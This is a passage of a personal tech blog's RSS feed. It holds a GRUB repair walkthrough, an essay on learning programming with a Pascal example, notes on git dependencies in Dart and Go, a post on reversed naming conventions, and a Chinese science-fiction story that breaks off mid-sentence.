<code>/tmp/mydir/bin</code>, I discovered that it was a broken symbolic link.</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">(gparted)$ <span class="hljs-built_in">ls</span> /tmp/mydir/bin -al</span><br><span class="line">lrwxrwxrwx 1 root root 7 May 28  2020 /tmp/mydir/bin -&gt; usr/bin</span><br></pre></div></div><p  class="par"> It appears that <code>/bin</code> is a symlink to <code>usr/bin</code>, but my <code>/usr</code> directory resides on the other partition and not yet mounted. With the directory <code>/usr</code> mounted, the <code>chroot</code> command works as desired.</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">(gparted)$ mount /dev/sda7 /tmp/mydir/usr</span><br><span class="line">(gparted)$ <span class="hljs-built_in">chroot</span> /tmp/mydir</span><br><span class="line">(ubuntu)$</span><br></pre></div></div><p  class="par"> The spawned interactive shell allows command to run as it were in my Ubuntu system. Type <code>grub-install /dev/nvme0n1</code> to write in the new serial number of root partition. It’s worth noting that the argument <code>/dev/nvme0n1</code> passed to <code>grub-install</code> is the name of the <em>hard disk device</em> to write instead of some partition name like <code>/dev/nvme0n1p1</code>.</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">(ubuntu)$ grub-install /dev/nvme0n1</span><br><span class="line">Installing <span class="hljs-keyword">for</span> x86_64-efi platform.</span><br><span class="line">grub-install: error: cannot find EFI directory.</span><br></pre></div></div><p  class="par"> Oops, the command failed and something still going wrong. After some time of inspection, I find the culprit to be that the directory <code>/boot/efi</code> is empty, which by default should be a bind mount to partition <code>/dev/nvme0n1p1</code> but not mounted properly. This can be solved with another <code>mount</code> command</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">(ubuntu)$ mount /dev/nvme0n1p1 /boot/efi</span><br><span class="line">(ubuntu)$ grub-install /dev/nvme0n1</span><br><span class="line">Installing <span class="hljs-keyword">for</span> x86_64-efi platform.</span><br><span class="line">Installation finished. No error reported.</span><br></pre></div></div><p  class="par"> By now the boot information is eventually updated. I reboot my laptop and everything works as-is.</p><p >The key takeaway from this tweaking process is that certain special directories – like <code>/usr</code> or <code>/boot/efi</code> – reside on separate partitions outside the root <code>/</code> on my laptop. When repairing GRUB or dealing with similar boot issues, it’s crucial to correctly mount all relevant partitions to reconstruct the full filesystem hierarchy. Failing to do so can lead to errors like broken symbolic links or missing binaries during chroot.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      <category domain="https://i.hsfzxjy.site/tags/System-Maintainance/">System Maintainance</category>
      
      
      <comments>https://i.hsfzxjy.site/move-ubuntu-root-partition/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>A New Programmer Kicks a Roadblock</title>
      <link>https://i.hsfzxjy.site/a-new-programmer-kicks-a-roadblock/</link>
      <guid>https://i.hsfzxjy.site/a-new-programmer-kicks-a-roadblock/</guid>
      <pubDate>Mon, 19 Sep 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;The time I composed my first program can be back to my junior high school age. It was the first day of PC lesson, and everybody crowded </description>
        
      
      
      
      <content:encoded><![CDATA[<p >The time I composed my first program can be back to my junior high school age. It was the first day of PC lesson, and everybody crowded to the computer classroom. We were told to learn “programming” there. The kids who were talented would be selected and trained for OI <sup id="fnref:1"><a href="#fn:1">1</a></sup>. Others instead would go to an ordinary class and learn something more general.</p><p >I was anxious. Before the time I had no concept of what “programming” is, nor had I ever gone through a <em>real</em> PC lesson. The PC lesson in my primary school barely taught anything. Over the time the teachers let us play games instead. I could type merely a dozen of characters per minute, since I’d never received a thorough typing training. I was ignorant of inside the metal box. I was a complete computer idiot.</p><p >But some of my classmates did. They typed swiftly like wind, they knew how to play with the operating system, and what’s more, they were chattering excitedly about things like “C language”, “array” or “for-loop”, words I’d never heard of.</p><p >I sit in front of a monitor and the class began. The teacher said we were going to learn a language named <em>“Pascal”</em>, and she instructed us to open the <em>“Free Pascal IDE”</em>. I followed a few clicks through a cascaded menu and finally reached the item. A window popped out.</p><p  class="par"> <img loading="lazy" src="https://imbed-1254463987.cos.ap-nanjing.myqcloud.com/2022-09-20-fpc.png" alt="clip&gt;2022-09-20-fpc.png!width=600"></p><p  class="par"> The screenshot was taken on my Ubuntu recently, but at the time it was on Windows 7 and looked slightly different. Not many people these days have heard of the Pascal language, and fewer have seen this antique interface.</p><p >It was the weirdest interface I had ever seen. The IDE was like another system trapped in a small unresizable window <sup id="fnref:2"><a href="#fn:2">2</a></sup>, with queerly rendered icons and widgets. The menu wouldn’t expand on cursor hovering. The editor wouldn’t scroll when I wheel my mouse. And most importantly, there was English everywhere, which frightened me.</p><p >The teacher then showed us our first program to type. It was a simple one that reads an integer from one file, and writes its square to another. The code was like</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">program</span> program1;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  a: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  assign(input, <span class="hljs-string">&#x27;program1.in&#x27;</span>); reset(input);</span><br><span class="line">  assign(output, <span class="hljs-string">&#x27;program1.out&#x27;</span>); rewrite(output);</span><br><span class="line">  <span class="hljs-keyword">read</span>(a);</span><br><span class="line">  writeln(a * a);</span><br><span class="line">  close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div><p  class="par"> It took me quite a while to put these lines onto the screen, and more time to “save the code as a file”. Before the day I had no idea of what a “file” is, plus the file selector of IDE was not ergonomic at all. After saving I just noticed an icon with title <code>program1.pas</code> popped out in the Windows file explorer. Then I hit the <code>Compile</code> menu entry. More icons popped out, including one named <code>program1.exe</code> — and that was my program.</p><p >The next to figure out was how to run the program, which was comprised of several complicated steps.</p><p >The first thing I should do is to right-click in the file explorer, select the “New -&gt; Text Document” entry, and rename it to <code>program1.in</code>. The OS would prompted me as I’ve changed the file extension, but I should click “Yes”. Then right-click on the created file, select “Open with…” and choose “Notepad” in the dialog. In the notepad type an integer like <code>3</code>, save and close it.</p><p >By now the input was prepared, and I should double-click the <code>program1.exe</code> file to execute the program. A black window flashed by, and one more icon with title <code>program1.out</code> appeared. Open it with the same trick as input file, where I saw the result number <code>9</code>.</p><p >Woah, that was amazing. Within 40 minutes I’d created something “intelligent”, albeit excessively simple, working faithfully whatever number I fed <sup id="fnref:3"><a href="#fn:3">3</a></sup>.</p><p >In company with the flood of joy, however, there goes the frustration. It aroused a feeling that programming is complicated as ordering a banquet for a serious occasion, with so much doctrinal detail to care about. What upset me the most is, I spent most of my time fighting against irrelevant issues, but caught little idea about true programming throughout the class hour. The reason is that I lacked certain understanding about the OS beneath, without which one could go nowhere on the trip towards programming.</p><p >And there exists another question — is interacting with a program always so painful? Of course not, but until several months later did I realize the <code>assign(...)</code> statements were not a necessity of an integral program, and there’s so called “command line interface” where you can type the input easily and immediately get the result. The awkward interaction bridged by files was actually dedicated for OI evaluation, as I knew afterwards. It took me one year to understand the ABC of GUI programs, when I built my first Form-based application with Delphi. My program no longer shipped with an ugly black window! And it unlocked varied interaction as the ones for daily use. After more years, with a broader understanding of programming I get, I am able to create websites, mobile apps or anything fit in my requirement. But for a 12-year-old kid at the time, the first program was just not appealing and NOT COOL at all.</p><p >The class, of course, was not designed for teaching cool things. It was for choosing talented guys towards a specific target. But over the years, I kept seeing people who were new to programming and struggled at half way, for one reason or another. This makes me consider about the root obstacle for a new guy to learn programming.</p><p >The way they are taught is no doubt a fundamental factor. Learners should be motivated so as to earn confidence. I used to know some power users <sup id="fnref:4"><a href="#fn:4">4</a></sup> who get started with programming smoothly and swiftly. They have clear goals for programming, some to tweak the system behavior and others to automate daily work. They learn the minimal knowledge by documentation or blog posts, and then come up with a prototype program which accomplishes the job. The entire process is interesting and fulfilling.</p><p >But for elementary learners, the ones who know little or nothing about computers, this does not always apply. Most of them are aimless, having no idea what programming can be used for. What’s worse, they are taught to use inappropriate tooling, deteriorating the learning to some boring and painful nightmare.</p><p >I can remember in the Programming 101 of my college around six years ago, we were taught C and to use the obsolete Visual C++ 6.0 IDE. The compulsory course was rather like a math one, where most time was spent in the classroom reading slides, and homework was handwritten to figure out the result of code fragments. The merely four coding tasks were to implement some algorithms and data structures, fairly dull. Some of the classmates had no deep knowledge of computers, or even didn’t use before (since mobile devices were popularized). They went through a hard time to understand low-level concepts like pointers, and were desperate in finishing the coding tasks. They learnt for the exams, with little or no interest, and soon forgot the things in one or two semesters.</p><p >I am not claiming languages at low-level like C is not suitable as the first language — for those will major in computer science, they demonstrate well how the machine works. But other learners deserve a much modern language at a higher level, plus a coding environment that will hide off obscure machine detail. The language and tooling should ease the hurdle to create appealing projects.</p><p >The language we do have, like Python. It’d better to be young or carefully designed, so that backward compatibility won’t cause too much confusing syntax. It should support imperative paradigm so as not to blow the learner’s brain (unless for mathematicians), but not limited to this for going further. And most importantly, it should conceal the low-level stuff to better illustrate the basic idea of programming.</p><p >But the tooling we don’t, at least not yet perfect. Lots of work should be done to create such a layer between OS and ignorant learners, and should be done perfectly well without bugs. I’ve seen bugged programming environment leaked more detail about the underlying support, causing its users frustrated and frightened.</p><p >The need of domain-specific learners may also be noticed. Some people learn programming to improve the productivity in their expertised fields, e.g., data analysis or financial trading. Like power user, they would be fulfilled if the first few programs can assist the jobs, but from time to time that’s not the case. The guidance or tools, however, are often poorly crafted, probably because there’re few professional programmers in the field.</p><p >Over the time I have witnessed programming languages and toolchains evolving, which enables the chance for skilled guys to build faster and safer programs more easily, but the learning curve of 0 to 1 benefits not much from the trend. I am expecting to see it change in the future.</p><div class="footnotes"><ol><li class="footnote" id="fn:1">Olympiad in Informatics, a series of algorithm competitions for teenagers.</li><li class="footnote" id="fn:2">The command line window before Windows 10 era cannot be resized by dragging the border.</li><li class="footnote" id="fn:3">Some large numbers won’t work, of course, which I did not try at the time.</li><li class="footnote" id="fn:4">Power users are those who uses advanced features of the operating system that are not used by the average users. They usually have some technical background.</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Methodology/">Methodology</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Programming/">Programming</category>
      
      
      <comments>https://i.hsfzxjy.site/a-new-programmer-kicks-a-roadblock/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Git-based Dependencies in Dart and Go</title>
      <link>https://i.hsfzxjy.site/dart-go-git-package-spec/</link>
      <guid>https://i.hsfzxjy.site/dart-go-git-package-spec/</guid>
      <pubDate>Mon, 04 Jul 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Both Dart and Go support decentralized package distribution. One is able to directly adopt an existing git repository as dependency, eas</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Both Dart and Go support decentralized package distribution. One is able to directly adopt an existing git repository as dependency, easing the effort of distributing packages.</p><p >Sometimes we might expect more fine-grained control on what to pull from a git repository. For example, to lock a package’s version, we would specify a particular tag, commit or branch name to pull from. Or if it’s a mono-repo, we would choose a sub-directory from the repository root. This post summarizes how to achieve these purposes in both languages.</p><h2 id="dart">Dart</h2><p ><code>dart pub add</code> has several options related to adding a git repository as dependency. To start with, one should specify the repository’s URL with the <code>--git-url</code> argument</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">dart pub add repo --git-url https://github.com/user/repo.git</span><br></pre></div></div><p  class="par"> This command adds a dependency named <code>repo</code> by pulling from <code>https://github.com/user/repo.git</code>. The <code>--git-path</code> argument can be provided to specify from which sub-directory of the repository dart should read from</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">dart pub add repo --git-url https://github.com/user/repo.git --git-path subdir/</span><br></pre></div></div><p  class="par"> Dart can also read from a specific git commit or branch (<strong>but not tags!</strong>), for which one should supply the <code>--git-ref</code> argument</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">dart pub add repo --git-url https://github.com/user/repo.git --git-path subdir/ --git-ref branch_name</span><br><span class="line"><span class="hljs-comment"># OR</span></span><br><span class="line">dart pub add repo --git-url https://github.com/user/repo.git --git-path subdir/ --git-ref &lt;commit-hash&gt;</span><br></pre></div></div><h2 id="go">Go</h2><p >Go modules are born to be based on git repositories. We regularly use <code>go get</code> to add a dependency</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">go get github.com/user/repo</span><br></pre></div></div><p  class="par"> , which pulls a remote repository, and parses its content as a Go module. A tag <code>@vX.Y.Z</code> can be suffixed to specify a particular git tag like</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">go get github.com/user/repo@vX.Y.Z</span><br></pre></div></div><p  class="par">, which instead pulls from a tag named <code>vX.Y.Z</code>. There’s a detailed description on version tag’s semantics at <a href="https://go.dev/ref/mod#versions">Go Modules Reference - Versions</a>. Straightforwardly, we can append its path after the repository’s name if a sub-directory is to be used</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">go get github.com/user/repo/subdir</span><br></pre></div></div><p  class="par"> Things become a little trickier when both sub-directory and tag are wanted. Literally, we might type a command as below</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line">go get github.com/user/repo/subdir@vX.Y.Z</span><br></pre></div></div><p  class="par"> It, however, will fail with a complaint <code class="_hl-tag" style="--color: ; display: inline;">go: github.com/user/repo/subdir@vX.Y.Z: invalid version: unknown revision subdir/vX.Y.Z</code>. What’s happening is, when a sub-directory is involved, Go modules will seek for a tag name with a pattern like <code>subdir/vX.Y.Z</code>, instead of aforementioned <code>vX.Y.Z</code>. This enables multiple sub-repos in a large mono-repo to individually tag their own version. We are hence required to rename the tag as <code>subdir/vX.Y.Z</code>, which should work as intended.</p><h1 id="references-8">References</h1><ul><li><a href="https://github.com/wowchemy/wowchemy-hugo-themes/issues/2754">https://github.com/wowchemy/wowchemy-hugo-themes/issues/2754</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Go/">Go</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Dart/">Dart</category>
      
      
      <comments>https://i.hsfzxjy.site/dart-go-git-package-spec/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Reversy Naming</title>
      <link>https://i.hsfzxjy.site/reversy-naming/</link>
      <guid>https://i.hsfzxjy.site/reversy-naming/</guid>
      <pubDate>Mon, 20 Jun 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;I am always a dedicated fan of writing naturally readable code – by “naturally readable” I mean, one can read a line of code as if it we</description>
        
      
      
      
      <content:encoded><![CDATA[<p >I am always a dedicated fan of writing naturally readable code – by “naturally readable” I mean, one can read a line of code as if it were a sentence of English (or maybe other human languages). It’s believed that the practice encourages more self-explainable code, as the code reads more like a human-composed article, instead of some gibberish only recognizable by machine.</p><p >The practice recommends to name functions or variables following the word order of human language, for English that is, subjects come after verbs, and adjectives go before nouns that being modified. The samples below showcase how it guides naming in a program (please hold your opinions about the casing)</p><ul><li><code>append_to_list(lst, item)</code>. A function that appends an item to a list, which can read as “append to the list (specified by name <code>lst</code>) with the item”.</li><li><code>register_service_notifier(func)</code>. A function that registers another function as a service notifier, which can read as “register a service notifier with the function <code>func</code>“.</li><li><code>UserFollowersListView</code>. The name of a web component which is a list view to display followers for a user.</li></ul><p  class="nomargin"> It plays well and improves my developing experience most of the time, but there is no silver bullet, just like other practices or guidelines.Sometimes I found the readability even degrades. I kept skimming the lines and just couldn’t locate an item efficiently.</p><p >For a brief period, I thought it was caused by the verbosely long word sequence, since compared with shorter ones, they took more time to recognize. But then after some investigation, I realized it was not.</p><p >The true culprit is that, such “naturally readable” naming displaces the emphasis from the beginning of word sequence. The emphasis of a name is the words with highest level, usually the most general ones. For instance, <code>append_to_list</code> emphasizes on <code>list</code>, which is however placed at the rear of the name.</p><p  class="nomargin"> As human, at least for me, a name with its emphasis at the front is more recognizable than those doesn’t. When skimming through a screen of code, my sight focuses on token boundary like whitespaces, hopping from one to another. During which time, I will glimpse at one or two words next to the boundary, which, usually at the fore of a name, and subconsciously match them to what I am concerning.</p><p  class="nomargin"> The matching process itself, will speed up if I meet first the words at a leading position of the name / phrase. My mental model resolves a concept by first the general idea and then the descriptive details. This, however, goes to the opposite of most human languages, as far as I know, whose grammar puts general words after the modifiers.</p><p >And thus I come up with a new practice – the <strong>Reversy Naming</strong>, in order to accord with my mental model, which places the emphasis first in a name, and then goes the words at low-level. To illustrate, I apply the style to the three names above as an example</p><ul><li><code>append_to_list</code> -&gt; <code>list_append</code></li><li><code>register_service_notifier</code> -&gt; <code>service_notifier_register</code></li><li><code>UserFollowersListView</code> -&gt; <code>ListViewUserFollowers</code></li></ul><p  class="par"> Probably wierd at first sight, but despite the inversed word order, they are not difficult to read. In fact, here comes several additional benefits.</p><p >Firstly, it conforms with the qualified syntax in most programming languages, which most people used to. A programming language with object-oriented paradigm usually supports a syntax like <code>object.method</code>. In Python I write things like <code>list.append()</code> for years, which is similar to aforementioned <code>list_append</code>, and I haven’t got any readability problem with it.</p><p >The next point is, the names will align well if they appears in consecutive lines. Consider there are many functions to operate a service, with “naturally readable” naming, we have</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RegisterServiceNotifier</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UnregisterServiceNotifier</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">StartService</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">StopService</span><span class="hljs-params">()</span></span></span><br></pre></div></div><p  class="par"> It is not evident at a glance that these functions are for manipulating the same type, although they have a common word “Service” in the middle. But with Reversy Naming, we could have</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ServiceNotifierRegister</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ServiceNotifierUnregister</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ServiceStart</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ServiceStop</span><span class="hljs-params">()</span></span></span><br></pre></div></div><p  class="par"> Now they share a common prefix, which indicates their affiliation, crystal and neat. If there’s a secondary emphasis, “Service -&gt; Notifier” for instance, they will also align in a good manner.</p><p >I’ve also spotted similar naming rules in the wild, which supports Reversy Naming is an acceptable and recommended practice in some scenarios. For example, the <a href="https://v2.vuejs.org/v2/style-guide/?redirect=true#Order-of-words-in-component-names-strongly-recommended">Style Guide - Vue.js</a> reads</p><blockquote><h3 id="order-of-words-in-component-names">Order of words in component names</h3><p >Component names should start with the highest-level (often most general) words and end with descriptive modifying words.</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">components/</span><br><span class="line">|- SearchButtonClear.vue</span><br><span class="line">|- SearchButtonRun.vue</span><br><span class="line">|- SearchInputQuery.vue</span><br><span class="line">|- SearchInputExcludeGlob.vue</span><br><span class="line">|- SettingsCheckboxTerms.vue</span><br><span class="line">|- SettingsCheckboxLaunchOnStartup.vue</span><br></pre></div></div><p >Since editors typically organize files alphabetically, all the important relationships between components are now evident at a glance.</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Best-Practice/">Best Practice</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Naming/">Naming</category>
      
      
      <comments>https://i.hsfzxjy.site/reversy-naming/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>人类一败涂地</title>
      <link>https://i.hsfzxjy.site/human-sucks/</link>
      <guid>https://i.hsfzxjy.site/human-sucks/</guid>
      <pubDate>Fri, 13 May 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;轻微的一阵异响。面前说话的她随即模糊起来，声音也渐渐远去，趋于缥缈。我这才注意到从一开始就没有看清她的脸——原来只是个梦罢了。意识跌落回现实。我又重新感受到了我的双腿，久坐后腰的酸痛，最后是沉重的眼皮。睁开眼，还是熟悉的银色舷窗。&lt;/p&gt;
&lt;p &gt;窗外的天王星已经很大了。</description>
        
      
      
      
      <content:encoded><![CDATA[<p >轻微的一阵异响。面前说话的她随即模糊起来，声音也渐渐远去，趋于缥缈。我这才注意到从一开始就没有看清她的脸——原来只是个梦罢了。意识跌落回现实。我又重新感受到了我的双腿，久坐后腰的酸痛，最后是沉重的眼皮。睁开眼，还是熟悉的银色舷窗。</p><p >窗外的天王星已经很大了。坐了这么多次，光看天王星的大小也能知道到哪了，估计还得两个小时才能下船。我伸了个懒腰，腿上的便携式电脑悠了起来，屏幕被点亮了。光标停在了讲稿的最后一行，冷冷地跳动着。</p><p >再读一遍吧。到那边可有得我忙的。</p><p >周围的人大多和我一样，要么在闭目养神，要么在低头对着电脑，大家都一言不发。长途旅行最能磨去一个人的精气，但为了工作我不得不奔波于各个星球之间——真是个乏味的时代。但有一个人不一样。</p><p >“孩子，那就是天王星了吧？”</p><p >说话的是我的曾祖父，就坐在我的对面。曾祖父用手扒着舷窗，像好奇的孩子一般瞪大了眼睛。他好像一直没睡，整趟旅途都在望着窗外。</p><p >曾祖父已经第二次坐这趟船了。我记得上次曾祖父也问过类似的话——大概是阿茨海默症没好透吧。一年前人们说已经攻克了这种疾病。但曾祖父太老了，死去的大脑机能是不可能被寻回的，所谓的“治疗”不过是维持现状罢了。</p><p >“我见过天王星，在小学的时候。”曾祖父依然望着窗外。“在一本科普杂志上，天王星是青色的，星环几乎立了起来，像芭蕾女孩的裙摆。但现在看到的好像和书上不太一样……”</p><p >“因为这船不是从黄道面过去的。”我有点不耐烦。错过了另一班更快的船，我不得不在路上多花一倍的时间，没有什么比这更糟了。“如果是从黄道面过去，天王星有可能是那个样子。”</p><p >“噢噢，是的……”曾祖父似乎察觉到我的不耐烦，怯怯地缩了缩脖子，安静下来。我又埋头看起了讲稿。</p><p >“不过，这真是个好时候啊！”曾祖父喃喃自语道。“一眨眼的功夫就到天王星了。”</p><p >快吗？我心想。本来还能更快些。</p><p >“年轻的时候我去找你曾祖母。那时一个城市还很小，现在看来近得要贴在一起了吧。但就算坐上铁皮汽车，也要吭哧吭哧走上一个小时。到了夏天即使有冷气，车里也和发酵了一样，就像那鲮鱼罐头……现在已经没有这种东西了。”</p><p >“那时出门很难吧？”我随口搭了一句，但很快又后悔了，担心曾祖父开始聊个没完。我对古代的事不感兴趣，眼下还有更紧急的事。</p><p >“你们年轻人可能受不了，我们这代人是习惯了。”曾祖父似乎很高兴有人和他聊天。“汽车的时速不过百来公里，现在看来慢得像蜗牛——欸，飞机倒是挺快的，半天之内就能跨越一个大洋。但飞机也不是随便就能坐，人们得先到达城市的边缘，再经过一些繁杂的手续，才能搭上飞机。有时为飞行做的准备甚至比实际飞行时间还要长，就像在长长的晚祷后却吃了泡面一样可笑。”</p><p >听起来和我现在出差差不多。屏幕自动变暗了，我又把它点亮。</p><p >“我还记得第一次坐飞机，是和我母亲出去玩的时候。那是一个温柔的傍晚。当我们的飞机从云中腾出时，我第一次从这个角度看到日落，兴奋得几乎尖叫了出来。天空离我那么近，但天空又是高不见顶。我被笼罩在一种美丽而深邃的神秘感中。</p><p >“现在的人或许难以理解这种兴奋了，但在那个年代，飞机可是一种充满希望的事物。”曾祖父眼里的目光变得深远，似乎在努力回味着这种感觉。“我们的先祖在土地上生活了上千年，也未曾腾空哪怕是数尺。这种”</p><!-- “这之后我又坐了很多次飞机，但最难忘的还是和你的曾祖母。”我发现一说到曾祖母，曾祖父的目光就变得柔和起来。“那也是你曾祖母第一次坐飞机，我能感受到她的紧张。当飞机离地时，她闭上了双眼，巨大的轰鸣和过载让她感到不安，紧紧地攥住了我的手。直到飞机开始巡航，她才睁开了眼，从平流层俯瞰我们的星球。我从她的眼中看到了惊讶 与陶醉，就像童年的我第一次看到时那样。随后的旅途中，她靠在我的肩上沉沉睡去，大概这种冲击也是很累人的。” --><p >“真好呀。那您第一次上太空时大概也是这种感受吧？”我对曾祖父的故事产生了兴趣，索性放下了电脑。还有一个多小时，聊聊天放松一下也好。</p><p >“上太空……那是好久好久之后的事了。”曾祖父的目光变得深远，好像在极力回忆。“说实话，曾祖父第一次进入太空时远不像坐飞机时那么兴奋，甚至可以说有些平静。”</p><p >“这是为什么呢？”我不禁感到奇怪。我从小是在空间站长大的，太空对我来说就像呼吸一样平常。但对于从地球迁徙来的曾祖父，太空应该会有十足的震撼。</p><p >“与其说是平静，倒不如说是释怀。”曾祖父接着说。“当时我想的是，像我这样活了大半辈子的人也能上太空了，人类总算还有点希望。”</p><p >曾祖父的回答让我稍微有些惊讶。在我的记忆中他少有表现出自己悲观的一面，在晚辈面前尤为如此。“这又是为什么呢？”</p><p >“孩子，我虽然在地球上生活了大半辈子，但我对太空的记忆却是很早就有了。</p><p >“我出生在一个充满希望的年代。在我出生前三十年，人类已经登上了月球。我童年时看的科幻电影中，我们的远征者已经在太空拓荒了。甚至在不远的近未来，我们就能拥有会飞的汽车，会浮空的滑板。我小学时写过的作文《十年后的家乡》，对未来有着天马行空的想象。</p><p >“但在我的一整个青年时代，人类再也没有登上过月球。甚至，在太空中的人两只手都能数得过来。”</p><p >“最开始的登月只是两个国家无意义的竞赛罢了。”我努力回忆课堂上学过的近代史。“后来人们也证明了，远航要有十足的技术准备，只乘一叶扁舟是激进而冒险的。”</p><p >“但是那次登月让人类相信，太空时代已经来临。”曾祖父喃喃道。“人们在影视作品中歌颂着、憧憬着未来。人们对未来抱有信心，这种信心给了人们乐观和勇气，却在随后的大半个世纪中消耗殆尽。幼年时的幻想，到了暮年时仍是幻想。”</p><p >我还没从这个角度看过历史。人类第一次进入太空，对我来说实在是太遥远了。这种遥远让我对时间的尺度失去了概念。宏观上看历史是上升的，但其中平稳的阶段，乃至低迷的阶段，长得足以是一个人的半生。就像旧世界的两次大战，从现在来看几乎是贴着发生的，但同时经历过它们的人，却是真实地生活了三十年。从这些时光中淌过的人，多少会怀有淡淡的伤感——这是后世史学家不会记载的一种微观的感受，却能不断震荡着，成为那个年代独特的背景音。</p><p >“当然了，最糟糕的还是那场萧条。”说到这里，曾祖父的目光黯淡了下来。</p><p >“萧条……是二十年代的事吧？”</p><p >“没错。虽然二十年代前已经有了些许端倪，但感觉真正的衰落还是从一场瘟疫开始的……现在已经很难想象瘟疫会有这么大的影响了。”</p><p >“确实……现代医学几乎是无所不能了。”</p><p >“更难想象的是，当时人们对自己的医学也是有信心的，这种信心甚至不减现在。人们认定可以控制住瘟疫的蔓延。”</p><p >“你们确实做到了。那场瘟疫和更古早的瘟疫比起来，不过是九牛一毛。”</p><p >“不不，你不了解，”曾祖父摇摇头，“那些是愚昧的年代，和我们有着本质的区别。我们本可以做得更好。”</p><p >“我们是曾经登上月球的种族，我们创造了这个星球的辉煌。但在当时，还是闹出了不少荒唐的事。这些事从现在来看想必是不可理喻的。不论是激进派，还是保守派，大家皆是如此。整个世界变得光怪陆离了起来。</p><p >“当时的瘟疫没有感染每一个人，却让每一个人感到了窒息。这种窒息是来自各个方面的，像一道无形的绳索悄悄勒紧人们的脖子。人们的束起了手脚，也束起了的思想，变得人人自危，不管在哪个经纬度都是一样——当然后者可能和瘟疫没有关系，只是这种感觉在瘟疫中被放大了。”</p><p >“真是奇怪呢。”我尝试代入这种感觉，发现自己理解不了——毕竟是好多年前的人了。但与曾祖父的对话让我感到很有意思。中学时我认为历史是枯燥的，现在我明白了，是缺乏临场感。</p><p >“孩子，不知道你能否想象。”曾祖父把目光移向窗外。“我出生在一个繁荣时代的末期，我怀着对未来的畅想步入青年，世界却开始走向衰退。这种衰退，如果单纯是由于外界的因素，那倒也是没什么。但这个辉煌的种族已经遇到过了同样的危机，却还是处理不好，甚至没有吸取任何教训。我所读过的历史，成为了我每一天的历史。</p><p >“从那时起，我不再对人类抱有希望。当时这么想的人不在少数。一个人年轻时认定了一件事，一辈子也就认定了这件事。</p><p >“有时我也会想，那些先于我出生的人又是怎样的呢？他们也许经历了比这更多的苦难，此时的心境不比我糟。我似乎没有理由失落，时代的衰退却又是真实地挡在我面前。但后来仔细一想，这种‘不应该失落’的想法更像是一种教条，来自前一代人的教条。前一代人无法带入我们的失落，就像我们无法代入他们的苦难。很多年后，当我们成为长辈，那个时代为我们塑造的想法又会成为新的教条。”</p><p >舱内安静了下来。我细细地品着曾祖父的话。</p><p >一阵熟悉的音乐响起，看窗外，我们不知不觉已经到了天王星轨道的空间站。我提上行李，转身想去帮曾祖父，他却自己站了起来。我搀着他，一起向舱外走去。</p><p >“孩子，你对人类有信心吗？”站台上，曾祖父突然问我。</p><p 